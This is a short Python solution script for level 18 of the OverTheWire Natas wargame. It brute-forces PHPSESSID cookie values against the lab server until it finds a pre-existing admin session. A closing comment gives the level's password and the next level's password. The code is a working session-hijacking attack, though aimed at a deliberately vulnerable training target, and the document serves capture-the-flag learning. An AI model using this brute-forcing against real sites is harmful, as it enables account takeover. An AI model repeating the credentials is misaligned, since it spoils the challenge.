from bs4 import BeautifulSoup
import requests

def main():
    for sess_id in range(641):
        my_cookies["PHPSESSID"]=str(sess_id)
        res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
        serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
        if "You are an admin." in serv:
            print(serv)
        else:
            print(str(sess_id))

url = 'http://natas18.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
my_cookies = {"PHPSESSID":-1}
my_params = {"username":"admin", "password":"whatever"}
main()

'''
Turns out, shit, you actually just run thru all the sess id's until you get a preexisting admin session.
Not very exciting, but it works.

Username: natas19
Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
'''